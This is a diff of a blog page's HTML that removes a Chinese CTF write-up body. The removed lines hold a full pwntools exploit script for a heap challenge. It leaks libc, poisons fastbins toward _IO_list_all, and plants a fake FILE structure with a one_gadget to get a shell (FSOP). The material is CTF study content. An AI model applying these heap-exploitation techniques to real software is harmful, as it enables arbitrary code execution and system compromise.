@@ -232,13 +232,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <a id="more"></a>
-<p>malloc的时候可以打印出地址，fastbin随意在libc中分配一个chunk，然后获取libc地址。</p>
-<p>看wp好像edit的时候没有限制范围，所以也可以直接edit去改stdout来leak。</p>
-<p>尝试往<code>malloc_hook</code>写了onegadget，然而一直没卵用，才知道原来是程序替换了<code>malloc_hook</code>。</p>
-<p>使用FSOP，照抄ctfwiki，然后自己随便调一调就可以了。</p>
-<p>exp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *from LibcSearcher import *#context.log_level=&apos;debug&apos;onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]def add(Size):	sh.recvuntil(&apos;&gt;&gt;&apos;)	sh.sendline(&apos;1&apos;)	sh.recvuntil(&apos;size : &apos;)	sh.sendline(str(Size))def edit(idx,content):	sh.recvuntil(&apos;&gt;&gt;&apos;)	sh.sendline(&apos;3&apos;)	sh.recvuntil(&apos;idx : &apos;)	sh.sendline(str(idx))	sh.recvuntil(&apos;text : &apos;)	sh.send(content)def delete(idx):	sh.recvuntil(&apos;&gt;&gt;&apos;)	sh.sendline(&apos;2&apos;)	sh.recvuntil(&apos;idx : &apos;)	sh.sendline(str(idx))libc=ELF(&quot;libc-2.23.so&quot;)while True:	sh=process(&quot;./pwn&quot;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;libc-2.23.so&apos;&#125;)	add(0x102)#0	sh.recvuntil(&apos;heap 0 : &apos;)	heap0=int(sh.recv(14),16)	#print hex(heap0)	add(0x68)#1	add(0xf0)#2	add(0x20)#3	payload = p64(0) + p64(0x101) + p64(heap0) * 2 + &quot;A&quot;*0xe0 + p16(0x100)	edit(0,payload)	payload = &apos;\x00&apos;*0x60 + p64(0x170)	edit(1,payload)	delete(2)	delete(1)	add(0xf0)#1	delete(1)	add(0x160)#1	edit(1,&apos;\x00&apos;*0xf0+p64(0)+p64(0x71)+p16(0x1aed)+&apos;\n&apos;)	add(0x60)#2	add(0x60)#4 #control malloc_hook	try:		sh.recvuntil(&apos;heap 4 : &apos;)	except EOFError:		sh.close()		continue	else:			leak=int(sh.recv(14),16)		libcbase=leak+0x23+0x10-0x3c4b20-0x10		log.success(&quot;libcbase: &quot;+hex(libcbase))		delete(2)		edit(1,&apos;\x00&apos;*0xf0+p64(0)+p64(0x71)+p64(libcbase+libc.sym[&apos;_IO_list_all&apos;]-0x23)+&apos;\n&apos;)		add(0x60)#2		add(0x60)#5		add(0x200)#6		sh.recvuntil(&apos;heap 6 : &apos;)		fake=int(sh.recv(14),16)		edit(6,&apos;/bin/sh\x00&apos;*(0x20/8)+p64(0)+p64(1)+&apos;a&apos;*144+p64(0)+&apos;a&apos;*0x10+p64(fake+0x100)+&apos;\x00&apos;*56+p64(libcbase+onegadget[0])+&apos;\n&apos;)		edit(5,&apos;\x00&apos;*19+p64(fake)+&apos;\n&apos;)		sh.recvuntil(&apos;&gt;&gt;&apos;)		sh.sendline(&apos;4&apos;)		#gdb.attach(sh)		sh.interactive()		break</span><br></pre></td></tr></table></figure>
+              <p>FSOP</p>
+          
       
     </div>
     
@@ -247,6 +242,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2019/09/26/KCTF2019Q3-卧薪尝胆/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
